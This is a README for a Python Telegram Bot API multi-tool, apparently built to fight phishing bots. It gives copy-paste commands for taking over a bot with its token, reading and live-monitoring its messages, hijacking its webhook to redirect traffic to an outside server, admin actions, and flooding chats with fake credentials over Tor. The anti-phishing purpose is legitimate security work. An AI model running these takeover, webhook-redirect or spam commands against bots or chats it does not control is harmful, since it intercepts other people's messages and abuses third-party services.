# TBot v2 — Telegram Bot API Multi-Tool

```
_________ ______   _______ _________
\__   __/(  ___ \ (  ___  )\__   __/
   ) (   | (   ) )| (   ) |   ) (   
   | |   | (__/ / | |   | |   | |   
   | |   |  __ (  | |   | |   | |   
   | |   | (  \ \ | |   | |   | |   
   | |   | )___) )| (___) |   | |   
   )_(   |/ \___/ (_______)   )_( by OZ  
```

Originally a tool to fight Telegram phishing bots by flooding them with fake data. **v2** expands TBot into a full Telegram Bot API multi-tool with 20+ commands for remote bot control, reconnaissance, and management — all from the command line, no Telegram login required.

---

## What's New in v2

- **Subcommand architecture** — clean `command` syntax instead of flags-only
- **Full Bot API coverage** — recon, read messages, send, monitor, webhook control, admin actions, and more
- **Built-in fallback wordlists** — name/surname/domain/city lists are now optional (defaults included)
- **TelegramAPI wrapper class** — proper error handling, JSON parsing, proxy support
- **Raw API access** — call any Telegram Bot API method directly via `raw` command
- **Live monitoring** — continuous polling mode with `monitor`
- **Webhook control** — view, set, delete, or hijack webhooks
- **Chat admin tools** — ban, unban, pin, unpin, set title/description, export invite links
- **File downloads** — get download URLs for any file sent to the bot
- **Full SOP documentation** — copy-paste ready commands for every feature

---

## Requirements

- Python 3.x
- `requests` library

```bash
pip install requests
```

> **Note:** `pathlib` is part of the Python standard library (3.4+) and does not need to be installed separately.

---

## Installation

```bash
git clone https://github.com/olizimmermann/tbot.git
cd tbot
pip install requests
```

---

## Quick Start

```bash
# Full recon (bot info + webhook status)
python3 tbot.py --bot-id BOT_ID --token TOKEN recon

# Read messages sent to the bot
python3 tbot.py --bot-id BOT_ID --token TOKEN read

# Live monitor incoming messages
python3 tbot.py --bot-id BOT_ID --token TOKEN monitor

# Send a message
python3 tbot.py --bot-id BOT_ID --token TOKEN send --chat-id CHAT_ID --text "hello"

# Original spam functionality
python3 tbot.py --bot-id BOT_ID --token TOKEN spam --chat-id CHAT_ID --messages 100
```

> **Important:** `--bot-id` is just the numeric ID (e.g. `6295561390`), not `bot6295561390`. The script adds the `bot` prefix automatically.

---

## All Commands

### Reconnaissance

| Command | Description |
|---------|-------------|
| `recon` | Full recon — bot info + webhook status |
| `read` | Read pending messages (getUpdates) |
| `monitor` | Live-stream incoming messages (Ctrl+C to stop) |
| `chat-info` | Get detailed chat info |
| `admins` | List chat administrators |
| `member-count` | Get chat member count |
| `get-member` | Get info about a specific user |
| `get-webhook` | View current webhook config (JSON) |
| `get-file` | Get download URL for a file |

### Actions

| Command | Description |
|---------|-------------|
| `send` | Send a message to a chat |
| `forward` | Forward a message between chats |
| `delete-msg` | Delete a message |

### Webhook Control

| Command | Description |
|---------|-------------|
| `get-webhook` | View current webhook |
| `set-webhook` | Set/hijack webhook URL |
| `delete-webhook` | Remove webhook (enables read/monitor) |

### Chat Admin (requires bot admin rights)

| Command | Description |
|---------|-------------|
| `ban` | Ban a user from chat |
| `unban` | Unban a user |
| `pin` | Pin a message |
| `unpin` | Unpin a message |
| `set-title` | Change chat title |
| `set-description` | Change chat description |
| `export-invite` | Export chat invite link |
| `leave` | Make the bot leave a chat |

### Advanced

| Command | Description |
|---------|-------------|
| `raw` | Call any Telegram Bot API method directly |
| `logout` | Log out bot from cloud API (10 min cooldown) |
| `spam` | Original TBot phisher payback spam |

---

## Command Examples

### Recon

```bash
python3 tbot.py --bot-id BOT_ID --token TOKEN recon
python3 tbot.py --bot-id BOT_ID --token TOKEN read --limit 10
python3 tbot.py --bot-id BOT_ID --token TOKEN monitor --interval 5
python3 tbot.py --bot-id BOT_ID --token TOKEN chat-info --chat-id -963346555
python3 tbot.py --bot-id BOT_ID --token TOKEN admins --chat-id -963346555
python3 tbot.py --bot-id BOT_ID --token TOKEN member-count --chat-id -963346555
python3 tbot.py --bot-id BOT_ID --token TOKEN get-member --chat-id -963346555 --user-id 123456789
```

### Send Messages

```bash
# Plain text
python3 tbot.py --bot-id BOT_ID --token TOKEN send --chat-id -963346555 --text "Hello"

# HTML formatted
python3 tbot.py --bot-id BOT_ID --token TOKEN send --chat-id -963346555 --text "<b>Bold</b>" --parse-mode HTML

# Silent (no notification)
python3 tbot.py --bot-id BOT_ID --token TOKEN send --chat-id -963346555 --text "Shh" --silent
```

### Webhook Control

```bash
# Check webhook
python3 tbot.py --bot-id BOT_ID --token TOKEN get-webhook

# Delete webhook (required before using read/monitor)
python3 tbot.py --bot-id BOT_ID --token TOKEN delete-webhook

# Hijack webhook to your server
python3 tbot.py --bot-id BOT_ID --token TOKEN set-webhook --url https://your-server.com/hook
```

### Admin Actions

```bash
python3 tbot.py --bot-id BOT_ID --token TOKEN ban --chat-id -963346555 --user-id 123456789
python3 tbot.py --bot-id BOT_ID --token TOKEN pin --chat-id -963346555 --message-id 42 --silent
python3 tbot.py --bot-id BOT_ID --token TOKEN set-title --chat-id -963346555 --title "New Title"
```

### Raw API Access

```bash
# Any method with no params
python3 tbot.py --bot-id BOT_ID --token TOKEN raw --method getMe

# Any method with JSON params
python3 tbot.py --bot-id BOT_ID --token TOKEN raw --method sendMessage --params '{"chat_id":"-963346555","text":"hello"}'
```

### Spam (Original Functionality)

```bash
# Default fake credentials
python3 tbot.py --bot-id BOT_ID --token TOKEN spam --chat-id 963346555 --messages 100

# Custom message with random variables
python3 tbot.py --bot-id BOT_ID --token TOKEN spam --chat-id 963346555 --messages 50 --text "Email: P_EMAIL | Pass: P_PASSWORD | IP: P_IP"

# Custom timing
python3 tbot.py --bot-id BOT_ID --token TOKEN spam --chat-id 963346555 --messages 200 --min-sleep 2 --max-sleep 10

# With proxy (e.g. Tor)
python3 tbot.py --bot-id BOT_ID --token TOKEN --proxy 127.0.0.1 --proxy-port 9050 spam --chat-id 963346555 --messages 100
```

Spam variables: `P_IP`, `P_EMAIL`, `P_PASSWORD`, `P_ZIP`, `P_CITY`, `P_RANDHIGHINT`, `P_ORG`

---

## Common Workflows

### Bot Takeover

```bash
python3 tbot.py --bot-id BOT_ID --token TOKEN recon
python3 tbot.py --bot-id BOT_ID --token TOKEN delete-webhook
python3 tbot.py --bot-id BOT_ID --token TOKEN read
python3 tbot.py --bot-id BOT_ID --token TOKEN monitor
```

### Investigate a Chat

```bash
python3 tbot.py --bot-id BOT_ID --token TOKEN chat-info --chat-id -CHATID
python3 tbot.py --bot-id BOT_ID --token TOKEN admins --chat-id -CHATID
python3 tbot.py --bot-id BOT_ID --token TOKEN member-count --chat-id -CHATID
```

### Hijack Phisher Webhook

```bash
python3 tbot.py --bot-id BOT_ID --token TOKEN get-webhook
python3 tbot.py --bot-id BOT_ID --token TOKEN set-webhook --url https://your-server.com/hook
```

---

## Global Options

| Flag | Description |
|------|-------------|
| `--bot-id` | Bot ID (numeric, required) |
| `--token` | Bot token (required) |
| `--proxy` | Proxy address (optional) |
| `--proxy-port` | Proxy port (optional) |

---

## Notes

- **Negative chat-id** (e.g. `-963346555`) = group/supergroup/channel
- **Positive chat-id** = individual user DM
- **getUpdates vs Webhook** are mutually exclusive — delete webhook first to use `read`/`monitor`
- **Updates expire after 24 hours** on Telegram's servers
- **Bots can't initiate DMs** — a user must message the bot first
- **Admin commands** only work if the bot has admin rights in the chat

---

## Full SOP

See [SOP.md](SOP.md) for a complete copy-paste ready reference of every command with all options.

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for instructions on how to submit changes.

---

## Disclaimer

This tool is intended for **security research and anti-phishing purposes only**. Use responsibly and in accordance with applicable laws. The authors are not responsible for misuse.

---

## Credits

- Original TBot by [OZ](https://github.com/olizimmermann)
- v2 enhancements: subcommand architecture, full Bot API coverage, recon/monitoring/webhook control, built-in wordlists, SOP documentation
